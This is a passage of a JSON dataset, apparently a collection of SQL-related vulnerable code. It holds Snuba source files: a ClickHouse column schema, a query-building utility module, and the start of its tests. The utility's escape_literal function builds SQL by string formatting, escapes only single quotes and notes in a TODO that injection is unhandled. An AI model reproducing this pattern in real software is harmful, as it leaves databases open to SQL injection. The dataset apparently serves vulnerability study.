self._flattened:\n            if col.flattened in self._lookup:\n                raise RuntimeError(\"Duplicate column: {}\".format(col.flattened))\n\n            self._lookup[col.flattened] = col\n            # also store it by the escaped name\n            self._lookup[col.escaped] = col\n\n    def __repr__(self):\n        return 'ColumnSet({})'.format(repr(self.columns))\n\n    def __eq__(self, other):\n        return self.__class__ == other.__class__ \\\n            and self._flattened == other._flattened\n\n    def __len__(self):\n        return len(self._flattened)\n\n    def __add__(self, other):\n        if isinstance(other, ColumnSet):\n            return ColumnSet(self.columns + other.columns)\n        return ColumnSet(self.columns + other)\n\n    def __contains__(self, key):\n        return key in self._lookup\n\n    def __getitem__(self, key):\n        return self._lookup[key]\n\n    def __iter__(self):\n        return iter(self._flattened)\n\n    def get(self, key, default=None):\n        try:\n            return self[key]\n        except KeyError:\n            return default\n\n    def for_schema(self):\n        return ', '.join(column.for_schema() for column in self.columns)\n\n\nMETADATA_COLUMNS = ColumnSet([\n    # optional stream related data\n    ('offset', Nullable(UInt(64))),\n    ('partition', Nullable(UInt(16))),\n])\n\nPROMOTED_TAG_COLUMNS = ColumnSet([\n    # These are the classic tags, they are saved in Snuba exactly as they\n    # appear in the event body.\n    ('level', Nullable(String())),\n    ('logger', Nullable(String())),\n    ('server_name', Nullable(String())),  # future name: device_id?\n    ('transaction', Nullable(String())),\n    ('environment', Nullable(String())),\n    ('sentry:release', Nullable(String())),\n    ('sentry:dist', Nullable(String())),\n    ('sentry:user', Nullable(String())),\n    ('site', Nullable(String())),\n    ('url', Nullable(String())),\n])\n\nPROMOTED_CONTEXT_TAG_COLUMNS = ColumnSet([\n    # These are promoted tags that come in in `tags`, but are more closely\n    # related to contexts.  To avoid naming confusion with Clickhouse nested\n    # columns, they are stored in the database with s/./_/\n    # promoted tags\n    ('app_device', Nullable(String())),\n    ('device', Nullable(String())),\n    ('device_family', Nullable(String())),\n    ('runtime', Nullable(String())),\n    ('runtime_name', Nullable(String())),\n    ('browser', Nullable(String())),\n    ('browser_name', Nullable(String())),\n    ('os', Nullable(String())),\n    ('os_name', Nullable(String())),\n    ('os_rooted', Nullable(UInt(8))),\n])\n\nPROMOTED_CONTEXT_COLUMNS = ColumnSet([\n    ('os_build', Nullable(String())),\n    ('os_kernel_version', Nullable(String())),\n    ('device_name', Nullable(String())),\n    ('device_brand', Nullable(String())),\n    ('device_locale', Nullable(String())),\n    ('device_uuid', Nullable(String())),\n    ('device_model_id', Nullable(String())),\n    ('device_arch', Nullable(String())),\n    ('device_battery_level', Nullable(Float(32))),\n    ('device_orientation', Nullable(String())),\n    ('device_simulator', Nullable(UInt(8))),\n    ('device_online', Nullable(UInt(8))),\n    ('device_charging', Nullable(UInt(8))),\n])\n\nREQUIRED_COLUMNS = ColumnSet([\n    ('event_id', FixedString(32)),\n    ('project_id', UInt(64)),\n    ('group_id', UInt(64)),\n    ('timestamp', DateTime()),\n    ('deleted', UInt(8)),\n    ('retention_days', UInt(16)),\n])\n\nALL_COLUMNS = REQUIRED_COLUMNS + [\n    # required for non-deleted\n    ('platform', Nullable(String())),\n    ('message', Nullable(String())),\n    ('primary_hash', Nullable(FixedString(32))),\n    ('received', Nullable(DateTime())),\n\n    # optional user\n    ('user_id', Nullable(String())),\n    ('username', Nullable(String())),\n    ('email', Nullable(String())),\n    ('ip_address', Nullable(String())),\n\n    # optional geo\n    ('geo_country_code', Nullable(String())),\n    ('geo_region', Nullable(String())),\n    ('geo_city', Nullable(String())),\n\n    ('sdk_name', Nullable(String())),\n    ('sdk_version', Nullable(String())),\n    ('sdk_integrations', Array(String())),\n    ('modules', Nested([\n        ('name', String()),\n        ('version', String()),\n    ])),\n    ('culprit', Nullable(String())),\n    ('type', Nullable(String())),\n    ('version', Nullable(String())),\n] + METADATA_COLUMNS \\\n  + PROMOTED_CONTEXT_COLUMNS \\\n  + PROMOTED_TAG_COLUMNS \\\n  + PROMOTED_CONTEXT_TAG_COLUMNS \\\n  + [\n    # other tags\n    ('tags', Nested([\n        ('key', String()),\n        ('value', String()),\n    ])),\n\n    # other context\n    ('contexts', Nested([\n        ('key', String()),\n        ('value', String()),\n    ])),\n\n    # interfaces\n\n    # http interface\n    ('http_method', Nullable(String())),\n    ('http_referer', Nullable(String())),\n\n    # exception interface\n    ('exception_stacks', Nested([\n        ('type', Nullable(String())),\n        ('value', Nullable(String())),\n        ('mechanism_type', Nullable(String())),\n        ('mechanism_handled', Nullable(UInt(8))),\n    ])),\n    ('exception_frames', Nested([\n        ('abs_path', Nullable(String())),\n        ('filename', Nullable(String())),\n        ('package', Nullable(String())),\n        ('module', Nullable(String())),\n        ('function', Nullable(String())),\n        ('in_app', Nullable(UInt(8))),\n        ('colno', Nullable(UInt(32))),\n        ('lineno', Nullable(UInt(32))),\n        ('stack_level', UInt(16)),\n    ])),\n]\n\n# The set of columns, and associated keys that have been promoted\n# to the top level table namespace.\nPROMOTED_COLS = {\n    'tags': frozenset(col.flattened for col in (PROMOTED_TAG_COLUMNS + PROMOTED_CONTEXT_TAG_COLUMNS)),\n    'contexts': frozenset(col.flattened for col in PROMOTED_CONTEXT_COLUMNS),\n}\n\n# For every applicable promoted column,  a map of translations from the column\n# name  we save in the database to the tag we receive in the query.\nCOLUMN_TAG_MAP = {\n    'tags': {col.flattened: col.flattened.replace('_', '.') for col in PROMOTED_CONTEXT_TAG_COLUMNS},\n    'contexts': {},\n}\n\n# And a reverse map from the tags the client expects to the database columns\nTAG_COLUMN_MAP = {\n    col: dict(map(reversed, trans.items())) for col, trans in COLUMN_TAG_MAP.items()\n}\n\n# The canonical list of foo.bar strings that you can send as a `tags[foo.bar]` query\n# and they can/will use a promoted column.\nPROMOTED_TAGS = {\n    col: [COLUMN_TAG_MAP[col].get(x, x) for x in PROMOTED_COLS[col]]\n    for col in PROMOTED_COLS\n}\n\n\ndef get_table_definition(name, engine, columns=ALL_COLUMNS):\n    return \"\"\"\n    CREATE TABLE IF NOT EXISTS %(name)s (%(columns)s) ENGINE = %(engine)s\"\"\" % {\n        'columns': columns.for_schema(),\n        'engine': engine,\n        'name': name,\n    }\n\n\ndef get_test_engine(\n        order_by=settings.DEFAULT_ORDER_BY,\n        partition_by=settings.DEFAULT_PARTITION_BY,\n        version_column=settings.DEFAULT_VERSION_COLUMN,\n        sample_expr=settings.DEFAULT_SAMPLE_EXPR):\n    return \"\"\"\n        ReplacingMergeTree(%(version_column)s)\n        PARTITION BY %(partition_by)s\n        ORDER BY %(order_by)s\n        SAMPLE BY %(sample_expr)s ;\"\"\" % {\n        'order_by': settings.DEFAULT_ORDER_BY,\n        'partition_by': settings.DEFAULT_PARTITION_BY,\n        'version_column': settings.DEFAULT_VERSION_COLUMN,\n        'sample_expr': settings.DEFAULT_SAMPLE_EXPR,\n    }\n\n\ndef get_replicated_engine(\n        name,\n        order_by=settings.DEFAULT_ORDER_BY,\n        partition_by=settings.DEFAULT_PARTITION_BY,\n        version_column=settings.DEFAULT_VERSION_COLUMN,\n        sample_expr=settings.DEFAULT_SAMPLE_EXPR):\n    return \"\"\"\n        ReplicatedReplacingMergeTree('/clickhouse/tables/{shard}/%(name)s', '{replica}', %(version_column)s)\n        PARTITION BY %(partition_by)s\n        ORDER BY %(order_by)s\n        SAMPLE BY %(sample_expr)s;\"\"\" % {\n        'name': name,\n        'order_by': order_by,\n        'partition_by': partition_by,\n        'version_column': version_column,\n        'sample_expr': sample_expr,\n    }\n\n\ndef get_distributed_engine(cluster, database, local_table,\n                           sharding_key=settings.DEFAULT_SHARDING_KEY):\n    return \"\"\"Distributed(%(cluster)s, %(database)s, %(local_table)s, %(sharding_key)s);\"\"\" % {\n        'cluster': cluster,\n        'database': database,\n        'local_table': local_table,\n        'sharding_key': sharding_key,\n    }\n\n\ndef get_local_table_definition():\n    return get_table_definition(\n        settings.DEFAULT_LOCAL_TABLE, get_replicated_engine(name=settings.DEFAULT_LOCAL_TABLE)\n    )\n\n\ndef get_dist_table_definition():\n    assert settings.CLICKHOUSE_CLUSTER, \"CLICKHOUSE_CLUSTER is not set.\"\n\n    return get_table_definition(\n        settings.DEFAULT_DIST_TABLE,\n        get_distributed_engine(\n            cluster=settings.CLICKHOUSE_CLUSTER,\n            database='default',\n            local_table=settings.DEFAULT_LOCAL_TABLE,\n        )\n    )\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/getsentry/snuba/blob/f38d13360fadd693b70be70632993dff32bb5a30",
        "file_path": "/snuba/util.py",
        "source": "from flask import request\n\nfrom clickhouse_driver.errors import Error as ClickHouseError\nfrom datetime import date, datetime, timedelta\nfrom dateutil.parser import parse as dateutil_parse\nfrom dateutil.tz import tz\nfrom functools import wraps\nfrom hashlib import md5\nfrom itertools import chain, groupby\nimport jsonschema\nimport logging\nimport numbers\nimport re\nimport simplejson as json\nimport six\nimport _strptime  # fixes _strptime deferred import issue\nimport time\n\nfrom snuba import clickhouse, schemas, settings, state\nfrom snuba.clickhouse import escape_col, ALL_COLUMNS, PROMOTED_COLS, TAG_COLUMN_MAP, COLUMN_TAG_MAP\n\n\nlogger = logging.getLogger('snuba.util')\n\n\n# A column name like \"tags[url]\"\nNESTED_COL_EXPR_RE = re.compile('^(tags|contexts)\\[([a-zA-Z0-9_\\.:-]+)\\]$')\n\n# example partition name: \"('2018-03-13 00:00:00', 90)\"\nPART_RE = re.compile(r\"\\('(\\d{4}-\\d{2}-\\d{2})', (\\d+)\\)\")\nDATE_TYPE_RE = re.compile(r'(Nullable\\()?Date\\b')\nDATETIME_TYPE_RE = re.compile(r'(Nullable\\()?DateTime\\b')\nQUOTED_LITERAL_RE = re.compile(r\"^'.*'$\")\n\n\nclass InvalidConditionException(Exception):\n    pass\n\n\nclass Literal(object):\n    def __init__(self, literal):\n        self.literal = literal\n\n\ndef to_list(value):\n    return value if isinstance(value, list) else [value]\n\n\ndef string_col(col):\n    col_type = ALL_COLUMNS.get(col, None)\n    col_type = str(col_type) if col_type else None\n\n    if col_type and 'String' in col_type and 'FixedString' not in col_type:\n        return escape_col(col)\n    else:\n        return 'toString({})'.format(escape_col(col))\n\n\ndef parse_datetime(value, alignment=1):\n    dt = dateutil_parse(value, ignoretz=True).replace(microsecond=0)\n    return dt - timedelta(seconds=(dt - dt.min).seconds % alignment)\n\n\ndef column_expr(column_name, body, alias=None, aggregate=None):\n    \"\"\"\n    Certain special column names expand into more complex expressions. Return\n    a 2-tuple of:\n        (expanded column expression, sanitized alias)\n\n    Needs the body of the request for some extra data used to expand column expressions.\n    \"\"\"\n    assert column_name or aggregate\n    assert not aggregate or (aggregate and (column_name or alias))\n    column_name = column_name or ''\n\n    if isinstance(column_name, (tuple, list)) and isinstance(column_name[1], (tuple, list)):\n        return complex_column_expr(column_name, body)\n    elif isinstance(column_name, six.string_types) and QUOTED_LITERAL_RE.match(column_name):\n        return escape_literal(column_name[1:-1])\n    elif column_name == settings.TIME_GROUP_COLUMN:\n        expr = settings.TIME_GROUPS[body['granularity']]\n    elif NESTED_COL_EXPR_RE.match(column_name):\n        expr = tag_expr(column_name)\n    elif column_name in ['tags_key', 'tags_value']:\n        expr = tags_expr(column_name, body)\n    elif column_name == 'issue':\n        expr = 'group_id'\n    else:\n        expr = escape_col(column_name)\n\n    if aggregate:\n        if expr:\n            expr = u'{}({})'.format(aggregate, expr)\n            if aggregate == 'uniq':  # default uniq() result to 0, not null\n                expr = 'ifNull({}, 0)'.format(expr)\n        else:  # This is the \"count()\" case where the '()' is already provided\n            expr = aggregate\n\n    alias = escape_col(alias or column_name)\n\n    return alias_expr(expr, alias, body)\n\n\ndef complex_column_expr(expr, body, depth=0):\n    # TODO instead of the mutual recursion between column_expr and complex_column_expr\n    # we should probably encapsulate all this logic in a single recursive column_expr\n    if depth == 0:\n        # we know the first item is a function\n        ret = expr[0]\n        expr = expr[1:]\n\n        # if the last item of the toplevel is a string, it's an alias\n        alias = None\n        if len(expr) > 1 and isinstance(expr[-1], six.string_types):\n            alias = expr[-1]\n            expr = expr[:-1]\n    else:\n        # is this a nested function call?\n        if len(expr) > 1 and isinstance(expr[1], tuple):\n            ret = expr[0]\n            expr = expr[1:]\n        else:\n            ret = ''\n\n    # emptyIfNull(col) is a simple pseudo function supported by Snuba that expands\n    # to the actual clickhouse function ifNull(col, '') Until we figure out the best\n    # way to disambiguate column names from string literals in complex functions.\n    if ret == 'emptyIfNull' and len(expr) >= 1 and isinstance(expr[0], tuple):\n        ret = 'ifNull'\n        expr = (expr[0] + (Literal('\\'\\''),),) + expr[1:]\n\n    first = True\n    for subexpr in expr:\n        if isinstance(subexpr, tuple):\n            ret += '(' + complex_column_expr(subexpr, body, depth + 1) + ')'\n        else:\n            if not first:\n                ret += ', '\n            if isinstance(subexpr, six.string_types):\n                ret += column_expr(subexpr, body)\n            else:\n                ret += escape_literal(subexpr)\n        first = False\n\n    if depth == 0 and alias:\n        return alias_expr(ret, alias, body)\n\n    return ret\n\n\ndef alias_expr(expr, alias, body):\n    \"\"\"\n    Return the correct expression to use in the final SQL. Keeps a cache of\n    the previously created expressions and aliases, so it knows when it can\n    subsequently replace a redundant expression with an alias.\n\n    1. If the expression and alias are equal, just return that.\n    2. Otherwise, if the expression is new, add it to the cache and its alias so\n       it can be reused later and return `expr AS alias`\n    3. If the expression has been aliased before, return the alias\n    \"\"\"\n    alias_cache = body.setdefault('alias_cache', [])\n\n    if expr == alias:\n        return expr\n    elif alias in alias_cache:\n        return alias\n    else:\n        alias_cache.append(alias)\n        return u'({} AS {})'.format(expr, alias)\n\n\ndef tag_expr(column_name):\n    \"\"\"\n    Return an expression for the value of a single named tag.\n\n    For tags/contexts, we expand the expression depending on whether the tag is\n    \"promoted\" to a top level column, or whether we have to look in the tags map.\n    \"\"\"\n    col, tag = NESTED_COL_EXPR_RE.match(column_name).group(1, 2)\n\n    # For promoted tags, return the column name.\n    if col in PROMOTED_COLS:\n        actual_tag = TAG_COLUMN_MAP[col].get(tag, tag)\n        if actual_tag in PROMOTED_COLS[col]:\n            return string_col(actual_tag)\n\n    # For the rest, return an expression that looks it up in the nested tags.\n    return u'{col}.value[indexOf({col}.key, {tag})]'.format(**{\n        'col': col,\n        'tag': escape_literal(tag)\n    })\n\n\ndef tags_expr(column_name, body):\n    \"\"\"\n    Return an expression that array-joins on tags to produce an output with one\n    row per tag.\n    \"\"\"\n    assert column_name in ['tags_key', 'tags_value']\n    col, k_or_v = column_name.split('_', 1)\n    nested_tags_only = state.get_config('nested_tags_only', 1)\n\n    # Generate parallel lists of keys and values to arrayJoin on\n    if nested_tags_only:\n        key_list = '{}.key'.format(col)\n        val_list = '{}.value'.format(col)\n    else:\n        promoted = PROMOTED_COLS[col]\n        col_map = COLUMN_TAG_MAP[col]\n        key_list = u'arrayConcat([{}], {}.key)'.format(\n            u', '.join(u'\\'{}\\''.format(col_map.get(p, p)) for p in promoted),\n            col\n        )\n        val_list = u'arrayConcat([{}], {}.value)'.format(\n            ', '.join(string_col(p) for p in promoted),\n            col\n        )\n\n    cols_used = all_referenced_columns(body) & set(['tags_key', 'tags_value'])\n    if len(cols_used) == 2:\n        # If we use both tags_key and tags_value in this query, arrayjoin\n        # on (key, value) tag tuples.\n        expr = (u'arrayJoin(arrayMap((x,y) -> [x,y], {}, {}))').format(\n            key_list,\n            val_list\n        )\n\n        # put the all_tags expression in the alias cache so we can use the alias\n        # to refer to it next time (eg. 'all_tags[1] AS tags_key'). instead of\n        # expanding the whole tags expression again.\n        expr = alias_expr(expr, 'all_tags', body)\n        return u'({})[{}]'.format(expr, 1 if k_or_v == 'key' else 2)\n    else:\n        # If we are only ever going to use one of tags_key or tags_value, don't\n        # bother creating the k/v tuples to arrayJoin on, or the all_tags alias\n        # to re-use as we won't need it.\n        return 'arrayJoin({})'.format(key_list if k_or_v == 'key' else val_list)\n\n\ndef is_condition(cond_or_list):\n    return (\n        # A condition is:\n        # a 3-tuple\n        len(cond_or_list) == 3 and\n        # where the middle element is an operator\n        cond_or_list[1] in schemas.CONDITION_OPERATORS and\n        # and the first element looks like a column name or expression\n        isinstance(cond_or_list[0], (six.string_types, tuple, list))\n    )\n\n\ndef all_referenced_columns(body):\n    \"\"\"\n    Return the set of all columns that are used by a query.\n    \"\"\"\n    col_exprs = []\n\n    # These fields can reference column names\n    for field in ['arrayjoin', 'groupby', 'orderby', 'selected_columns']:\n        if field in body:\n            col_exprs.extend(to_list(body[field]))\n\n    # Conditions need flattening as they can be nested as AND/OR\n    if 'conditions' in body:\n        flat_conditions = list(chain(*[[c] if is_condition(c) else c for c in body['conditions']]))\n        col_exprs.extend([c[0] for c in flat_conditions])\n\n    if 'aggregations' in body:\n        col_exprs.extend([a[1] for a in body['aggregations']])\n\n    # Return the set of all columns referenced in any expression\n    return set(chain(*[columns_in_expr(ex) for ex in col_exprs]))\n\n\ndef columns_in_expr(expr):\n    \"\"\"\n    Get the set of columns that are referenced by a single column expression.\n    Either it is a simple string with the column name, or a nested function\n    that could reference multiple columns\n    \"\"\"\n    cols = []\n    # TODO possibly exclude quoted args to functions as those are\n    # string literals, not column names.\n    if isinstance(expr, six.string_types):\n        cols.append(expr.lstrip('-'))\n    elif (isinstance(expr, (list, tuple)) and len(expr) >= 2\n          and isinstance(expr[1], (list, tuple))):\n        for func_arg in expr[1]:\n            cols.extend(columns_in_expr(func_arg))\n    return cols\n\n\ndef tuplify(nested):\n    if isinstance(nested, (list, tuple)):\n        return tuple(tuplify(child) for child in nested)\n    return nested\n\n\ndef conditions_expr(conditions, body, depth=0):\n    \"\"\"\n    Return a boolean expression suitable for putting in the WHERE clause of the\n    query.  The expression is constructed by ANDing groups of OR expressions.\n    Expansion of columns is handled, as is replacement of columns with aliases,\n    if the column has already been expanded and aliased elsewhere.\n    \"\"\"\n    if not conditions:\n        return ''\n\n    if depth == 0:\n        sub = (conditions_expr(cond, body, depth + 1) for cond in conditions)\n        return u' AND '.join(s for s in sub if s)\n    elif is_condition(conditions):\n        lhs, op, lit = conditions\n\n        if (\n            lhs in ('received', 'timestamp') and\n            op in ('>', '<', '>=', '<=', '=', '!=') and\n            isinstance(lit, str)\n        ):\n            lit = parse_datetime(lit)\n\n        # If the LHS is a simple column name that refers to an array column\n        # (and we are not arrayJoining on that column, which would make it\n        # scalar again) and the RHS is a scalar value, we assume that the user\n        # actually means to check if any (or all) items in the array match the\n        # predicate, so we return an `any(x == value for x in array_column)`\n        # type expression. We assume that operators looking for a specific value\n        # (IN, =, LIKE) are looking for rows where any array value matches, and\n        # exclusionary operators (NOT IN, NOT LIKE, !=) are looking for rows\n        # where all elements match (eg. all NOT LIKE 'foo').\n        if (\n            isinstance(lhs, six.string_types) and\n            lhs in ALL_COLUMNS and\n            type(ALL_COLUMNS[lhs].type) == clickhouse.Array and\n            ALL_COLUMNS[lhs].base_name != body.get('arrayjoin') and\n            not isinstance(lit, (list, tuple))\n            ):\n            any_or_all = 'arrayExists' if op in schemas.POSITIVE_OPERATORS else 'arrayAll'\n            return u'{}(x -> assumeNotNull(x {} {}), {})'.format(\n                any_or_all,\n                op,\n                escape_literal(lit),\n                column_expr(lhs, body)\n            )\n        else:\n            return u'{} {} {}'.format(\n                column_expr(lhs, body),\n                op,\n                escape_literal(lit)\n            )\n\n    elif depth == 1:\n        sub = (conditions_expr(cond, body, depth + 1) for cond in conditions)\n        sub = [s for s in sub if s]\n        res = u' OR '.join(sub)\n        return u'({})'.format(res) if len(sub) > 1 else res\n    else:\n        raise InvalidConditionException(str(conditions))\n\n\ndef escape_literal(value):\n    \"\"\"\n    Escape a literal value for use in a SQL clause\n    \"\"\"\n    # TODO in both the Literal and the raw string cases, we need to\n    # sanitize the string from potential SQL injection.\n    if isinstance(value, Literal):\n        return value.literal\n    elif isinstance(value, six.string_types):\n        value = value.replace(\"'\", \"\\\\'\")\n        return u\"'{}'\".format(value)\n    elif isinstance(value, datetime):\n        value = value.replace(tzinfo=None, microsecond=0)\n        return \"toDateTime('{}')\".format(value.isoformat())\n    elif isinstance(value, date):\n        return \"toDate('{}')\".format(value.isoformat())\n    elif isinstance(value, (list, tuple)):\n        return u\"({})\".format(', '.join(escape_literal(v) for v in value))\n    elif isinstance(value, numbers.Number):\n        return str(value)\n    elif value is None:\n        return ''\n    else:\n        raise ValueError(u'Do not know how to escape {} for SQL'.format(type(value)))\n\n\ndef raw_query(body, sql, client, timer, stats=None):\n    \"\"\"\n    Submit a raw SQL query to clickhouse and do some post-processing on it to\n    fix some of the formatting issues in the result JSON\n    \"\"\"\n    project_ids = to_list(body['project'])\n    project_id = project_ids[0] if project_ids else 0  # TODO rate limit on every project in the list?\n    stats = stats or {}\n    grl, gcl, prl, pcl, use_cache = state.get_configs([\n        ('global_per_second_limit', 1000),\n        ('global_concurrent_limit', 1000),\n        ('project_per_second_limit', 1000),\n        ('project_concurrent_limit', 1000),\n        ('use_cache', 0),\n    ])\n\n    # Specific projects can have their rate limits overridden\n    prl, pcl = state.get_configs([\n        ('project_per_second_limit_{}'.format(project_id), prl),\n        ('project_concurrent_limit_{}'.format(project_id), pcl),\n    ])\n\n    all_confs = six.iteritems(state.get_all_configs())\n    query_settings = {k.split('/', 1)[1]: v for k, v in all_confs if k.startswith('query_settings/')}\n\n    timer.mark('get_configs')\n\n    query_id = md5(force_bytes(sql)).hexdigest()\n    with state.deduper(query_id) as is_dupe:\n        timer.mark('dedupe_wait')\n\n        result = state.get_result(query_id) if use_cache else None\n        timer.mark('cache_get')\n\n        stats.update({\n            'is_duplicate': is_dupe,\n            'query_id': query_id,\n            'use_cache': bool(use_cache),\n            'cache_hit': bool(result)}\n        ),\n\n        if result:\n            status = 200\n        else:\n            with state.rate_limit('global', grl, gcl) as (g_allowed, g_rate, g_concurr):\n                metrics.gauge('query.global_concurrent', g_concurr)\n                stats.update({'global_rate': g_rate, 'global_concurrent': g_concurr})\n\n                with state.rate_limit(project_id, prl, pcl) as (p_allowed, p_rate, p_concurr):\n                    stats.update({'project_rate': p_rate, 'project_concurrent': p_concurr})\n                    timer.mark('rate_limit')\n\n                    if g_allowed and p_allowed:\n\n                        # Experiment, reduce max threads by 1 for each extra concurrent query\n                        # that a project has running beyond the first one\n                        if 'max_threads' in query_settings and p_concurr > 1:\n                            maxt = query_settings['max_threads']\n                            query_settings['max_threads'] = max(1, maxt - p_concurr + 1)\n\n                        try:\n                            data, meta = client.execute(\n                                sql,\n                                with_column_types=True,\n                                settings=query_settings,\n                                # All queries should already be deduplicated at this point\n                                # But the query_id will let us know if they aren't\n                                query_id=query_id\n                            )\n                            data, meta = scrub_ch_data(data, meta)\n                            status = 200\n                            if body.get('totals', False):\n                                assert len(data) > 0\n                                data, totals = data[:-1], data[-1]\n                                result = {'data': data, 'meta': meta, 'totals': totals}\n                            else:\n                                result = {'data': data, 'meta': meta}\n\n                            logger.debug(sql)\n                            timer.mark('execute')\n                            stats.update({\n                                'result_rows': len(data),\n                                'result_cols': len(meta),\n                            })\n\n                            if use_cache:\n                                state.set_result(query_id, result)\n                                timer.mark('cache_set')\n\n                        except BaseException as ex:\n                            error = six.text_type(ex)\n                            status = 500\n                            logger.error(\"Error running query: %s\\n%s\", sql, error)\n                            if isinstance(ex, ClickHouseError):\n                                result = {'error': {\n                                    'type': 'clickhouse',\n                                    'code': ex.code,\n                                    'message': error,\n                                }}\n                            else:\n                                result = {'error': {\n                                    'type': 'unknown',\n                                    'message': error,\n                                }}\n\n                    else:\n                        status = 429\n                        result = {'error': {\n                            'type': 'ratelimit',\n                            'message': 'rate limit exceeded',\n                        }}\n\n    stats.update(query_settings)\n    state.record_query({\n        'request': body,\n        'sql': sql,\n        'timing': timer,\n        'stats': stats,\n        'status': status,\n    })\n\n    if settings.RECORD_QUERIES:\n        timer.send_metrics_to(metrics)\n    result['timing'] = timer\n\n    if settings.STATS_IN_RESPONSE or body.get('debug', False):\n        result['stats'] = stats\n        result['sql'] = sql\n\n    return (result, status)\n\n\ndef scrub_ch_data(data, meta):\n    # for now, convert back to a dict-y format to emulate the json\n    data = [{c[0]: d[i] for i, c in enumerate(meta)} for d in data]\n    meta = [{'name': m[0], 'type': m[1]} for m in meta]\n\n    for col in meta:\n        # Convert naive datetime strings back to TZ aware ones, and stringify\n        # TODO maybe this should be in the json serializer\n        if DATETIME_TYPE_RE.match(col['type']):\n            for d in data:\n                d[col['name']] = d[col['name']].replace(tzinfo=tz.tzutc()).isoformat()\n        elif DATE_TYPE_RE.match(col['type']):\n            for d in data:\n                dt = datetime(*(d[col['name']].timetuple()[:6])).replace(tzinfo=tz.tzutc())\n                d[col['name']] = dt.isoformat()\n\n    return (data, meta)\n\n\ndef validate_request(schema):\n    \"\"\"\n    Decorator to validate that a request body matches the given schema.\n    \"\"\"\n    def decorator(func):\n        @wraps(func)\n        def wrapper(*args, **kwargs):\n\n            def default_encode(value):\n                if callable(value):\n                    return value()\n                else:\n                    raise TypeError()\n\n            if request.method == 'POST':\n                try:\n                    body = json.loads(request.data)\n                    schemas.validate(body, schema)\n                    kwargs['validated_body'] = body\n                    if kwargs.get('timer'):\n                        kwargs['timer'].mark('validate_schema')\n                except (ValueError, jsonschema.ValidationError) as e:\n                    result = {'error': {\n                        'type': 'schema',\n                        'message': str(e),\n                    }, 'schema': schema}\n                    return (\n                        json.dumps(result, sort_keys=True, indent=4, default=default_encode),\n                        400,\n                        {'Content-Type': 'application/json'}\n                    )\n            return func(*args, **kwargs)\n        return wrapper\n    return decorator\n\n\nclass Timer(object):\n    def __init__(self, name=''):\n        self.marks = [(name, time.time())]\n        self.final = None\n\n    def mark(self, name):\n        self.final = None\n        self.marks.append((name, time.time()))\n\n    def finish(self):\n        if not self.final:\n            start = self.marks[0][1]\n            end = time.time() if len(self.marks) == 1 else self.marks[-1][1]\n            diff_ms = lambda start, end: int((end - start) * 1000)\n            durations = [(name, diff_ms(self.marks[i][1], ts)) for i, (name, ts) in enumerate(self.marks[1:])]\n            self.final = {\n                'timestamp': int(start),\n                'duration_ms': diff_ms(start, end),\n                'marks_ms': {\n                    key: sum(d[1] for d in group) for key, group in groupby(sorted(durations), key=lambda x: x[0])\n                }\n            }\n        return self.final\n\n    def for_json(self):\n        return self.finish()\n\n    def send_metrics_to(self, metrics):\n        name = self.marks[0][0]\n        final = self.finish()\n        metrics.timing(name, final['duration_ms'])\n        for mark, duration in six.iteritems(final['marks_ms']):\n            metrics.timing('{}.{}'.format(name, mark), duration)\n\n\ndef time_request(name):\n    def decorator(func):\n        @wraps(func)\n        def wrapper(*args, **kwargs):\n            kwargs['timer'] = Timer(name)\n            return func(*args, **kwargs)\n        return wrapper\n    return decorator\n\n\ndef decode_part_str(part_str):\n    match = PART_RE.match(part_str)\n    if not match:\n        raise ValueError(\"Unknown part name/format: \" + str(part_str))\n\n    date_str, retention_days = match.groups()\n    date = datetime.strptime(date_str, '%Y-%m-%d')\n\n    return (date, int(retention_days))\n\n\ndef force_bytes(s):\n    if isinstance(s, bytes):\n        return s\n    return s.encode('utf-8', 'replace')\n\n\ndef create_metrics(host, port, prefix, tags=None):\n    \"\"\"Create a DogStatsd object with the specified prefix and tags. Prefixes\n    must start with `snuba.<category>`, for example: `snuba.processor`.\"\"\"\n\n    from datadog import DogStatsd\n\n    bits = prefix.split('.', 2)\n    assert len(bits) >= 2 and bits[0] == 'snuba', \"prefix must be like `snuba.<category>`\"\n\n    return DogStatsd(host=host, port=port, namespace=prefix, constant_tags=tags)\n\n\nmetrics = create_metrics(settings.DOGSTATSD_HOST, settings.DOGSTATSD_PORT, 'snuba.api')\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/getsentry/snuba/blob/f38d13360fadd693b70be70632993dff32bb5a30",
        "file_path": "/tests/test_util.py",
        "source": "from datetime import date, datetime\nimport simplejson as json\nimport time\n\nfrom base import BaseTest\n\nfrom snuba.util import (\n    all_referenced_columns,\n    column_expr,\n    complex_column_expr,\n    conditions_expr,\n    escape_literal,\n    tuplify,\n    Timer,\n)\n\n\nclass TestUtil(BaseTest):\n\n    def test_column_expr(self):\n        body = {\n            'granularity': 86400\n        }\n        # Single tag expression\n        assert column_expr('tags[foo]', body.copy()) ==\\\n            \"(tags.value[indexOf(tags.key, \\'foo\\')] AS `tags[foo]`)\"\n\n        # Promoted tag expression / no translation\n        assert column_expr('tags[server_name]', body.copy()) ==\\\n            \"(server_name AS `tags[server_name]`)\"\n\n        # Promoted tag expression / with translation\n        assert column_expr('tags[app.device]', body.copy()) ==\\\n            \"(app_device AS `tags[app.device]`)\"\n\n        # All tag keys expression\n        assert column_expr('tags_key', body.copy()) == (\n            '(arrayJoin(tags.key) AS tags_key)'\n        )\n\n        # If we are going to use both tags_key and tags_value, expand both\n        tag_group_body = {\n            'groupby': ['tags_key', 'tags_value']\n        }\n        assert column_expr('tags_key', tag_group_body) == (\n            '(((arrayJoin(arrayMap((x,y) -> [x,y], tags.key, tags.value)) '\n            'AS all_tags))[1] AS tags_key)'\n        )\n\n        assert column_expr('time', body.copy()) ==\\\n            \"(toDate(timestamp) AS time)\"\n\n        assert column_expr('col', body.copy(), aggregate='sum') ==\\\n            \"(sum(col) AS col)\"\n\n        assert column_expr(None, body.copy(), alias='sum', aggregate='sum') ==\\\n            \"sum\"  # This should probably be an error as its an aggregate with no column\n\n        assert column_expr('col', body.copy(), alias='summation', aggregate='sum') ==\\\n            \"(sum(col) AS summation)\"\n\n        # Special cases where count() doesn't need a column\n        assert column_expr('', body.copy(), alias='count', aggregate='count()') ==\\\n            \"(count() AS count)\"\n\n        assert column_expr('', body.copy(), alias='aggregate', aggregate='count()') ==\\\n            \"(count() AS aggregate)\"\n\n        # Columns that need escaping\n        assert column_expr('sentry:release', body.copy()) == '`sentry:release`'\n\n        # Columns that start with a negative sign (used in orderby to signify\n        # sort order) retain the '-' sign outside the escaping backticks (if 